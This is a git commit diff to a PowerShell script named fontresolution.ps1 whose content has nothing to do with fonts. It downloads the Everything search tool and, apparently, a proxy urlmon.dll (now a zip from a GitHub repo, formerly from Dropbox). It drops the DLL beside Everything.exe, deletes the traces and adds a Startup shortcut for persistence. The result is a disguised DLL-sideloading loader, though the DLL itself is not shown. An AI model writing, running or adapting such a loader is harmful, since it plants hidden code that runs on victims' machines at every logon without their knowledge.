23c5ab10f6d26fa013f42ef04c821d3cad58390f
decepdick <deceptivedick@outlook.com>
2025-08-29 09:33:02 -0700

    Update fontresolution.ps1

--- fontresolution.ps1
+++ fontresolution.ps1
@@ -1,8 +1,8 @@
 $success = $false
 $url1 = "https://www.voidtools.com/Everything-1.4.1.986.x64.zip"
-$url2 = "https://www.dropbox.com/scl/fi/qcqn2x5coh1jjua8sz711/urlmonproxy.dll?rlkey=teznxz6mjc2yg1xrgrupc6ik1&st=ttfpvbp3&dl=1"
-$url1Path = "$env:TEMP\file.zip"
-$url2Path = "$env:TEMP\urlmon.dll"
+$url2 = "https://github.com/decepdick/test-repo/blob/main/everything-dll.zip"
+$url1Path = "$env:TEMP\file1.zip"
+$url2Path = "$env:TEMP\file2.zip"
 $extractPath = "$env:LOCALAPPDATA\Everything"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Everything.lnk"
 $targetPath = "$extractPath\Everything.exe"
@@ -13,7 +13,7 @@ ni -ItemType Directory -Path $extractPath -Force
 iwr -Uri $url1 -OutFile $url1Path
 iwr -Uri $url2 -OutFile $url2Path
 Expand-Archive -Path $url1Path -Destination $extractPath -Force
-cp -Path $url2Path -Destination $extractPath -Force
+Expand-Archive -Path $url2path -Destination $extractPath -Force
 rm $url1Path, $url2Path -Force
 $WShell = New-Object -ComObject WScript.Shell
 $shortcut = $WShell.CreateShortcut($startupPath)
@@ -21,4 +21,5 @@ $shortcut.TargetPath = "$targetPath"
 $shortcut.Arguments = "-startup"
 $shortcut.Save()
 [Runtime.InteropServices.Marshal]::ReleaseComObject($WShell)
+
 $success = $true
